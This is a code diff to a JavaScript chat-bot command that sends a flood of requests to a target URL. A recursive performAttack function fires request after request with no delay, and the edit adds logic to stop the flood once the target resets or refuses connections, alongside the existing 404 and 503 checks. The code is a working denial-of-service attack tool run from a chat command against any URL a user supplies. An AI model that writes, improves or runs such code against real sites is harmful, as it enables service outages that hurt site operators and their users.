@@ -117,7 +117,10 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
     })
     .catch((err) => {
-        if (err.response?.status === 404) {
+        if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED') {
+            console.log(rainbow("Connection reset or refused. Stopping further attacks."));
+            continueAttack = false;
+        } else if (err.response?.status === 404) {
             console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
             continueAttack = false;
         } else if (err.response?.status === 503) {
@@ -134,6 +137,7 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
     });
 };
+
 
 module.exports.run = async ({ args, chat, font }) => {
     const targetUrl = args[0];
